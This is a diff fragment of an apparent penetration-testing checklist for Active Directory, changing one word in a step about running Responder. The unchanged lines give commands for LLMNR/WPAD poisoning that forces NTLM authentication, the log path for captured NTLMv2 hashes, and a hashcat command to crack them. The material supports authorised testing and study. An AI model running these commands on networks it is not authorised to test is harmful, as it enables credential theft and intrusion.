@@ -5,7 +5,7 @@ Reference: [AD Enumeration](../1-information-gathering/06-active-directory-enume
 
 ## Zero-cred enum (do all of these first)
 
-- [ ] **Start Responder in a dedicated tmux pane the moment you land internal** — this is the highest-ROI passive attack in AD, run it while everything else happens:
+- [ ] **Start Responder in a dedicated terminal the moment you land internal** — this is the highest-ROI passive attack in AD, run it while everything else happens:
   - Analyze-only first (no poisoning, just listen): `sudo responder -I tun0 -A`.
   - Full poisoning: `sudo responder -I tun0 -wF` (`-w` WPAD, `-F` force NTLM auth).
   - Captured hashes land at `/usr/share/responder/logs/*NTLMv2*.txt` — crack with `hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt`.
